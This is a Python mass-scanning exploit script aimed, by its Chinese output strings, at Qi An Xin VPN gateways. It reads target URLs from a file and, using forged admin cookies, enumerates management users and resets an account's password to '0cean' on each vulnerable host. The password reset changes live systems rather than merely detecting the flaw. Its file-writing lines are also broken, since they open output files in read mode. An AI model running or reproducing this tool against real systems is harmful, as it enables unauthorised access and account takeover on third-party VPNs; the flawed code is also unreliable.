import re
import urllib3
import requests
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_poc1(url):
    uid = 2
    header = {
        "Cookie": "admin_id=1; gw_admin_ticket=1;",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
    }
    path = "//admin/group/x_group.php?id=%s" % uid
    r = requests.get(url + path, headers=header, verify=False, allow_redirects=False)
    r.encoding = "utf-8"
    if r.status_code == 200 and "group_action.php" in r.text:
        if users := re.findall("本地认证-&gt;(.*?)</option>", r.text):
            print(f"[+] {url} 存在未授权管理用户遍历漏洞！！！！！！返回结果：{users}")
            with open("存在奇安信VPN未授权管理用户遍历漏洞的urls.txt") as f:
                f.write(url + "\n")
                f.close()
        else:
            pass

def check_poc2(url):
    user = "0cean"
    pwd = "0cean"
    header = {
        "Cookie": 'admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"%s","subAuthId":"1"}' % user,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        "Origin": url,
        "Referer": "%s/welcome.php" % url
    }
    body = {
        "old_pass": "",
        "password": pwd,
        "repassword": pwd
    }
    path = "/changepass.php?type=2"
    r = requests.post(url + path, headers=header, data=body, allow_redirects=False, verify=False)
    r.encoding = "utf-8"
    if r.status_code == 200 and "修改密码成功" in r.text:
        print(f"[+] {url} 存在任意账号密码修改漏洞！！！！！！")
        with open("存在奇安信VPN任意账号密码修改漏洞的urls.txt") as f:
            f.write(url + "\n")
            f.close()
    else:
        pass

def get_addr():
    with open("urls.txt", "r", encoding="utf-8") as f:
        for address in f.readlines():
            address = address.strip()
            yield address

if __name__ == "__main__":
    addrs = get_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future1 = executor.submit(check_poc1, addr)
        future2 = executor.submit(check_poc2, addr)